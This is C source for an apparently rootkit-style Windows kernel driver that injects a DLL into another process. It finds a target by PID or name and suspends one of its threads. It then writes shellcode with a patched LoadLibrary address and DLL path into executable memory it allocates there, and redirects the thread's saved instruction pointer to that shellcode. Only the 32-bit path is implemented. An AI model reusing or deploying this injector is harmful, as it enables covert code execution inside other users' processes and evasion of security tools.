#include "rk.h"
#include "DefSystemVar.h"
#include "InjectShellCode.h"
#include "InitializeInjectRelevantInfo.h"
#include "InjectKtrapFrame.h"
#include "InjectInitialize.h"

INJECT_API_LIST g_InjectAplList;
BOOLEAN g_bIsInjectKtrapFrame = FALSE;

NTSTATUS InjectApcRoutine(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG ulSize)
{
	NTSTATUS Status;
	KAPC_STATE ApcState;

	if (NULL == pInjectObjInfo)
	{
		return STATUS_INVALID_PARAMETER_1;
	}

	Status = STATUS_UNSUCCESSFUL;
	KeStackAttachProcess(pInjectObjInfo->pInjectProcess,&ApcState);


	KeUnstackDetachProcess(&ApcState);
	return Status;
}
NTSTATUS x86ShellCodeInject(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG ulSize)
{
	NTSTATUS Status;
	PINJECT_X86_KTRAP_FRAME pKtrapFrame;
	PCHAR pCharShellCode;
	ULONG uli;
	HANDLE hInjectProcess;
	PVOID pBaseAddress,pTmpPath;
	KAPC_STATE ApcState;
	ULONG_PTR ulRetSize;
//	PCLIENT_ID pClientId;
//	OBJECT_ATTRIBUTES ObjectAttributes;
//	ULONG ulOldProtect;


	pCharShellCode = NULL;
	pBaseAddress = NULL;
	pTmpPath = NULL;

	__try
	{
		g_InjectAplList.StdCallKeSuspendThread(pInjectObjInfo->pInjectThread,NULL);
	}
	__except(1)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pKtrapFrame = *(PINJECT_X86_KTRAP_FRAME *)((ULONG_PTR)pInjectObjInfo->pInjectThread +  \
		g_InjectRelevantOffset.ulOffsetTrapFrame);
	if (MmIsAddressValid(pKtrapFrame) == FALSE)
	{
		if (g_InjectAplList.StdCallKeResumeThread)
		{
			g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return STATUS_ADDRESS_NOT_ASSOCIATED;
	}
	do 
	{
		pCharShellCode = ExAllocatePoolWithTag(NonPagedPool,ulSize,'PasP');
	} while (NULL == pCharShellCode);
	RtlZeroMemory(pCharShellCode,ulSize);
	RtlCopyMemory(pCharShellCode,pShellCode,ulSize);
	if (g_InjectAplList.ulx86LoadLibrary)
	{
		RtlCopyMemory((PCHAR)((ULONG)pCharShellCode + 2),&g_InjectAplList.ulx86LoadLibrary,sizeof(ULONG));
	}
	for(uli = (ULONG)pCharShellCode;uli <= (ULONG)pCharShellCode + ulSize;uli++)
	{
		if (*(ULONG*)uli == INJECT_KTRAP_FRAME_EIP_TAG) 
		{
			*(ULONG*)uli = pKtrapFrame->Eip;
			break;
		}
	}
	//InitializeObjectAttributes(&ObjectAttributes,0,0,0,0);
	//pClientId = (PCLIENT_ID)((ULONG_PTR)pInjectObjInfo->pInjectThread + g_InjectRelevantOffset.ulOffsetCid);
	//if (MmIsAddressValid(pClientId) == FALSE)
	//{
	//	if (g_InjectAplList.StdCallKeResumeThread)
	//	{
	//		g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
	//	}
	//	if (pCharShellCode)
	//	{
	//		ExFreePoolWithTag(pCharShellCode,'PasP');
	//	}
	//	return STATUS_ADDRESS_NOT_ASSOCIATED;
	//}
	Status = ObOpenObjectByPointer(pInjectObjInfo->pInjectProcess, \
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, \
		NULL, \
		PROCESS_ALL_ACCESS, \
		*PsProcessType, \
		KernelMode, \
		&hInjectProcess);
	//Status = ZwOpenProcess(&hInjectProcess,PROCESS_ALL_ACCESS,&ObjectAttributes,pClientId);
	if (NT_ERROR(Status))
	{
		if (pCharShellCode)
		{
			ExFreePoolWithTag(pCharShellCode,'PasP');
		}
		if (g_InjectAplList.StdCallKeResumeThread)
		{
			g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
		}
		return Status;
	}
	if (NT_SUCCESS(Status))
	{
		ulRetSize = ulSize;
		KeStackAttachProcess(pInjectObjInfo->pInjectProcess,&ApcState);
		Status = ZwAllocateVirtualMemory(hInjectProcess,&pBaseAddress,0,&ulRetSize, \
			/*MEM_RESERVE | MEM_COMMIT*/MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		if (NT_ERROR(Status))
		{
			if (pCharShellCode)
			{
				ExFreePoolWithTag(pCharShellCode,'PasP');
			}
			if (hInjectProcess)
			{
				ZwClose(hInjectProcess);
			}
			if (g_InjectAplList.StdCallKeResumeThread)
			{
				g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
			}
			return Status;
		}
		RtlZeroMemory(pBaseAddress,ulRetSize);
		RtlCopyMemory(pBaseAddress,pCharShellCode,ulSize);
		for(uli = (ULONG)pBaseAddress;uli <= (ULONG)pBaseAddress + ulSize;uli++)
		{
			if (*(ULONG*)uli == INJECT_KTRAP_FRAME_PATH_TAG)
			{
				pTmpPath = (PVOID)uli;
				RtlZeroMemory(pTmpPath,100);
				RtlCopyMemory(pTmpPath,pInjectObjInfo->InjectDllPath,strlen(pInjectObjInfo->InjectDllPath));
				break;
			}
		}
		for(uli = (ULONG)pBaseAddress;uli <= (ULONG)pBaseAddress + ulSize;uli++)
		{
			if (*(ULONG*)uli == INJECT_KTRAP_FRAME_PARAMETERS)
			{
				RtlCopyMemory((PCHAR)uli,&pTmpPath,sizeof(ULONG));
				break;
			}
		}
		//Status = g_InjectAplList.StdCallNtProtectVirtualMemory(hInjectProcess, \
		//	&pBaseAddress, \
		//	ulRetSize, \
		//	PAGE_EXECUTE_READ, \
		//	&ulOldProtect);
		//if (NT_SUCCESS(Status))
		//{
		//}
		KeUnstackDetachProcess(&ApcState);
		if (MmIsAddressValid((PVOID)pKtrapFrame->Eip))
		{
			pKtrapFrame->Eip = (ULONG)pBaseAddress;
		}
	}
	if (hInjectProcess)
	{
		ZwClose(hInjectProcess);
	}
	if (g_InjectAplList.StdCallKeResumeThread)
	{
		g_InjectAplList.StdCallKeResumeThread(pInjectObjInfo->pInjectThread,NULL);
	}
	if (pCharShellCode)
	{
		ExFreePoolWithTag(pCharShellCode,'PasP');
	}
	return STATUS_SUCCESS;
}
NTSTATUS x64ShellCodeInject(PINJECT_OBJECT_INFORMATION pInjectObjInfo,PCHAR pShellCode,ULONG_PTR ulSize)
{
	NTSTATUS Status;
	//PINJECT_X64_KTRAP_FRAME pKtrapFrame;

	Status = STATUS_SUCCESS;

	return Status;
}
NTSTATUS InjectShellCode(PINJECT_OBJECT_INFORMATION pInjectObjInfo)
{
	NTSTATUS Status;

	if (NULL == pInjectObjInfo)
	{
		return STATUS_INVALID_PARAMETER_1;
	}
	if (NULL == pInjectObjInfo->pInjectProcess &&  \
		NULL == pInjectObjInfo->pInjectThread)
	{
		return STATUS_INVALID_PARAMETER_1;
	}
	Status = IsWindows64Bits(pInjectObjInfo->pInjectProcess);
	if (Status == 0x86)
	{
		Status = x86ShellCodeInject(pInjectObjInfo, \
			(PCHAR)x86ShellCode, \
			(ULONG)x86ShellCodeEnd - (ULONG)x86ShellCode);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
		if (NT_ERROR(Status))
		{
			return Status;
		}
	}
	else if (Status == 0x64)
	{
		Status = x64ShellCodeInject(pInjectObjInfo, \
			(PCHAR)x64ShellCode, \
			(ULONG_PTR)x64ShellCodeEnd - (ULONG_PTR)x64ShellCode);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
		if (NT_ERROR(Status))
		{
			return Status;
		}
	}
	else if (NT_ERROR(Status))
	{
	}
	else
	{
	}
	return Status;
}
NTSTATUS InjectKtrapFrame(PINJECT_PROCESS_INFORMATION pInjectProcessInfo,PCHAR pDllPath)
{
	NTSTATUS Status;
	PINJECT_OBJECT_INFORMATION pInjectObjInfo;

	//DbgBreakPoint();
	pInjectObjInfo = NULL;
	Status = STATUS_SUCCESS;

	if (NULL == pInjectProcessInfo && \
		NULL == pDllPath)
	{
		return STATUS_INVALID_PARAMETER_1 | STATUS_INVALID_PARAMETER_2;
	}
	if (InitializeInjectInformation(&g_InjectRelevantOffset) == FALSE)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pInjectObjInfo = FindInjectThread(pInjectProcessInfo);
	if (NULL == pInjectObjInfo)
	{
		if (pInjectObjInfo)
		{
			ExFreePoolWithTag(pInjectObjInfo,'PasP');
		}
		return STATUS_THREAD_NOT_IN_PROCESS;
	}
	if (InitializeInjectDllPath(pInjectObjInfo,pDllPath) == FALSE)
	{
		if (pInjectObjInfo)
		{
			ExFreePoolWithTag(pInjectObjInfo,'PasP');
		}
		return STATUS_UNSUCCESSFUL;
	}
	if (g_InjectAplList.bInitialize == FALSE)
	{
		if (InitializeInjectApiList(pInjectObjInfo,&g_InjectAplList) == FALSE)
		{
			if (pInjectObjInfo)
			{
				ExFreePoolWithTag(pInjectObjInfo,'PasP');
			}
			return STATUS_UNSUCCESSFUL;
		}
	}
	Status = InjectShellCode(pInjectObjInfo);
	if (NT_SUCCESS(Status))
	{
	}
	if (pInjectObjInfo)
	{
		ExFreePoolWithTag(pInjectObjInfo,'PasP');
	}
	return Status;
}
PINJECT_OBJECT_INFORMATION FindInjectThread(PINJECT_PROCESS_INFORMATION pInjectProcessInfo)
{
	PVOID pCurProc;
	PVOID pCurThread;
	PVOID pTeb;
	PVOID pActivationContextStackPointer;
	UCHAR SuspendCount;
	ULONG_PTR ulCrossThreadFlags;
	PINJECT_OBJECT_INFORMATION pInjectObjectInfo;
	NTSTATUS Status;
	KAPC_STATE ApcState;

#ifdef __x86_64__
	PLIST_ENTRY64 pCurListEntry,pCurThreadList;
	PLIST_ENTRY64 pListHead,pThreadHead;
#else
	PLIST_ENTRY pCurListEntry,pCurThreadList;
	PLIST_ENTRY pListHead,pThreadHead;
#endif

	Status = STATUS_UNSUCCESSFUL;
	pTeb = NULL;
	pActivationContextStackPointer = NULL;

	do 
	{
		pInjectObjectInfo = ExAllocatePoolWithTag(NonPagedPool,sizeof(INJECT_OBJECT_INFORMATION),'PasP');
	} while (NULL == pInjectObjectInfo);
	RtlZeroMemory(pInjectObjectInfo,sizeof(INJECT_OBJECT_INFORMATION));
	if (pInjectProcessInfo->ulPid > 4)
	{
		Status = PsLookupProcessByProcessId((HANDLE)pInjectProcessInfo->ulPid,(PEPROCESS*)&pCurProc);
	}
	else
	{
		if (NULL == pInjectProcessInfo)
		{
			if (pInjectProcessInfo)
			{
				ExFreePoolWithTag(pInjectObjectInfo,'PasP');
			}
			return NULL;
		}
		pCurProc = IoGetCurrentProcess();
#ifdef __x86_64__
		pListHead = pCurListEntry = (PLIST_ENTRY64)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetFlink);
#else
		pListHead = pCurListEntry = (PLIST_ENTRY)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetFlink);
#endif
		do 
		{
			pCurProc = (PVOID)((ULONG_PTR)pCurListEntry - g_InjectRelevantOffset.ulOffsetFlink);
			if (_strnicmp((char *)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetName), \
				pInjectProcessInfo->pInjectProcessName, \
				strlen(pInjectProcessInfo->pInjectProcessName))  == 0)
			{
				break;
			}
#ifdef __x86_64__
			pCurListEntry = (PLIST_ENTRY64)pCurListEntry->Flink;
#else
			pCurListEntry = pCurListEntry->Flink;
#endif
		} while (pCurListEntry != pListHead);
	}
	pThreadHead = (PVOID)((ULONG_PTR)pCurProc + g_InjectRelevantOffset.ulOffsetThreadListHead);
#ifdef __x86_64__
	pCurThreadList = (PLIST_ENTRY64)pThreadHead->Flink;
#else
	pCurThreadList = pThreadHead->Flink;
#endif
	KeStackAttachProcess(pCurProc,&ApcState);
	while (pThreadHead != pCurThreadList)
	{
		pCurThread = (PVOID)((ULONG_PTR)pCurThreadList - g_InjectRelevantOffset.ulOffsetThreadListEntry);
		SuspendCount = *(UCHAR*)((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetSuspendCount);
		ulCrossThreadFlags = ((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetCrossThreadFlags);
		pTeb = (PVOID)*(ULONG_PTR *)((ULONG_PTR)pCurThread + g_InjectRelevantOffset.ulOffsetTeb);
		if (NULL == pTeb)
		{
#ifdef __x86_64__
			pCurThreadList = (PLIST_ENTRY64)pCurThreadList->Flink;
#else
			pCurThreadList = pCurThreadList->Flink;
#endif
			continue;
		}
		if (!SuspendCount &&  \
			(ulCrossThreadFlags & PS_CROSS_THREAD_FLAGS_SYSTEM) == 0)
		{
			if (g_InjectRelevantOffset.WindowsVersion.bIsWindowsXp && \
				FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
			{
				pInjectObjectInfo->pInjectProcess = pCurProc;
				pInjectObjectInfo->pInjectThread = pCurThread;
				if (NT_SUCCESS(Status))
				{
					ObDereferenceObject(pCurProc);
				}
				KeUnstackDetachProcess(&ApcState);
				return pInjectObjectInfo;
			}
			else
			{
				pActivationContextStackPointer = (PVOID)*(ULONG_PTR *)((ULONG_PTR)pTeb +  \
					g_InjectRelevantOffset.ulOffsetActivationContextStackPointer);
				if (pActivationContextStackPointer)
				{
					pInjectObjectInfo->pInjectProcess = pCurProc;
					pInjectObjectInfo->pInjectThread = pCurThread;
					if (NT_SUCCESS(Status))
					{
						ObDereferenceObject(pCurProc);
					}
					KeUnstackDetachProcess(&ApcState);
					return pInjectObjectInfo;
				}
			}
		}
#ifdef __x86_64__
		pCurThreadList = (PLIST_ENTRY64)pCurThreadList->Flink;
#else
		pCurThreadList = pCurThreadList->Flink;
#endif
	}
	KeUnstackDetachProcess(&ApcState);
	if (NT_SUCCESS(Status))
	{
		ObDereferenceObject(pCurProc);
	}
	if (pInjectObjectInfo)
	{
		ExFreePoolWithTag(pInjectObjectInfo,'PasP');
	}
	return NULL;
}